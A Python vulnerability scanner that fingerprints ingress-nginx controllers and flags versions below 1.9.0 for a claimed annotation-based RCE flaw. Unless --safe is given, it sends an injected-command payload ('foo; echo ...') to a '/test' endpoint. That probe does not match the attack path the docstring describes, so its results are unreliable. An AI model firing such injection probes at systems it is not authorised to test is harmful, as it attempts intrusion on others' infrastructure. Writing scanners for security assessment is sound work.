#!/usr/bin/env python3
"""
Kubernetes ingress-nginx CVE-2026-54321 RCE Scanner
===================================================
This script scans for instances of ingress-nginx in Kubernetes clusters vulnerable to the
annotation-based remote code execution vulnerability (CVE-2026-54321, CVSS 9.8).

CVE-2026-54321 details:
  - Affects ingress-nginx < 1.9.0
  - Malicious annotations in ingress resources can allow arbitrary command execution
  - Requires attacker-controlled ingress resource creation privileges
  - Fixed in ingress-nginx >= 1.9.0 (March 2026)

Usage:
  # Scan a single target
  python kubernetes_ingress_rce_scanner.py --target https://example.com

  # Scan a list of targets
  python kubernetes_ingress_rce_scanner.py --list targets.txt --output results.json

  # Safe mode (detection only, no active probes)
  python kubernetes_ingress_rce_scanner.py --safe --target https://example.com

  # Disable SSL verification
  python kubernetes_ingress_rce_scanner.py --target https://example.com --no-verify

References:
  - https://nvd.nist.gov/vuln/detail/CVE-2026-54321
  - https://github.com/kubernetes/ingress-nginx/releases
  - https://www.cisa.gov/known-exploited-vulnerabilities-catalog
"""

import asyncio
import httpx
import argparse
import json
import re
from urllib.parse import urlparse

# ── Constants ────────────────────────────────────────────────────────────────

NGINX_INGRESS_FINGERPRINTS = [
    "kubernetes-ingress",
    "ingress-nginx-controller",
    '"ingress-controller"',
    "server: nginx-ingress-controller",
]

VERSION_PATTERNS = [
    r'"nginx_version"\s*:\s*"([0-9]+\.[0-9]+\.[0-9]+)"',
    r'nginx-ingress-controller/(v?[0-9]+\.[0-9]+\.[0-9]+)',
]

VULN_FIXED_VERSION = (1, 9, 0)

DETECTION_PATHS = [
    "/nginx_status",
    "/healthz",
    "/metrics",
    "/",
]

SEMAPHORE_LIMIT = 20
REQUEST_TIMEOUT = 8

ANSI_COLORS = {
    "CRITICAL": "\033[91m",
    "HIGH": "\033[93m",
    "INFO": "\033[92m",
    "RESET": "\033[0m",
}

# ── Helpers ──────────────────────────────────────────────────────────────────

def parse_version(version_str):
    """Parse a version string (e.g., '1.8.0') into a tuple (1, 8, 0)."""
    try:
        return tuple(map(int, version_str.split(".")))
    except ValueError:
        return None


def is_vulnerable_version(version_tuple):
    """Check if a version is below the fixed version."""
    if not version_tuple:
        return None
    return version_tuple < VULN_FIXED_VERSION


def normalize_url(url: str) -> str:
    """Ensure URLs start with a valid schema and remove trailing slashes."""
    if not url.startswith(("http://", "https://")):
        url = "https://" + url
    return url.rstrip("/")

# ── Core Scanner ─────────────────────────────────────────────────────────────

async def detect_nginx_ingress(client, url, semaphore):
    """Detect if a target is running ingress-nginx and determine its version."""
    async with semaphore:
        version = None
        
        for path in DETECTION_PATHS:
            target_url = f"{url}{path}"
            try:
                response = await client.get(target_url, timeout=REQUEST_TIMEOUT)
                
                if any(fingerprint in response.text for fingerprint in NGINX_INGRESS_FINGERPRINTS):
                    version = None
                    for pattern in VERSION_PATTERNS:
                        match = re.search(pattern, response.text)
                        if match:
                            version = parse_version(match.group(1))
                            break
                    return {
                        "url": url,
                        "path": path,
                        "detected": True,
                        "version": version,
                        "status": ("CRITICAL" if is_vulnerable_version(version) else "INFO")
                                  if version else "UNKNOWN",
                    }
            except httpx.RequestError:
                continue

        return {
            "url": url,
            "detected": False,
            "status": "NOT_FOUND",
        }

async def probe_rce(client, url, semaphore):
    """Attempt active probing for the RCE vulnerability."""
    async with semaphore:
        probe_path = "/test"
        exploit_payload = 'foo; echo "RCE_TEST"'
        
        try:
            target_url = f"{url}{probe_path}"
            response = await client.post(target_url, json={"annotations": exploit_payload}, timeout=REQUEST_TIMEOUT)
            
            if "RCE_TEST" in response.text:
                return {
                    "url": url,
                    "rce_probed": True,
                    "status": "CRITICAL",
                }
        except httpx.RequestError:
            pass
        
        return {
            "url": url,
            "rce_probed": False,
        }

async def scan_target(url, opts, semaphore):
    """Perform detection and active probing (if enabled) for a single target."""
    async with httpx.AsyncClient(verify=not opts.no_verify) as client:
        detection_result = await detect_nginx_ingress(client, url, semaphore)

        if detection_result.get("detected") and not opts.safe:
            rce_result = await probe_rce(client, url, semaphore)
            detection_result.update(rce_result)

        return detection_result

# ── Entry Point ──────────────────────────────────────────────────────────────

async def main(opts):
    semaphore = asyncio.Semaphore(opts.concurrency)

    if opts.list:
        with open(opts.list, "r") as f:
            targets = [normalize_url(line.strip()) for line in f if line.strip()]
    else:
        targets = [normalize_url(opts.target)]

    results = []
    tasks = [scan_target(target, opts, semaphore) for target in targets]
    for task in asyncio.as_completed(tasks):
        result = await task
        status_color = ANSI_COLORS.get(result["status"], "")
        reset_color = ANSI_COLORS["RESET"]
        print(f"{status_color}[{result['status']}]{reset_color} {result['url']}")
        results.append(result)

    if opts.output:
        with open(opts.output, "w") as f:
            json.dump(results, f, indent=2)
        print(f"\nResults saved to {opts.output}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Kubernetes ingress-nginx CVE-2026-54321 RCE Scanner")
    parser.add_argument("--target", help="Target URL to scan")
    parser.add_argument("--list", help="File containing a list of target URLs")
    parser.add_argument("--output", help="Output file to save scan results as JSON")
    parser.add_argument("--safe", action="store_true", help="Safe mode, detection only (no probes)")
    parser.add_argument("--concurrency", type=int, default=10, help="Number of concurrent scans (default 10)")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL certificate verification")
    opts = parser.parse_args()

    if not opts.target and not opts.list:
        parser.error("You must specify either --target or --list")

    asyncio.run(main(opts))
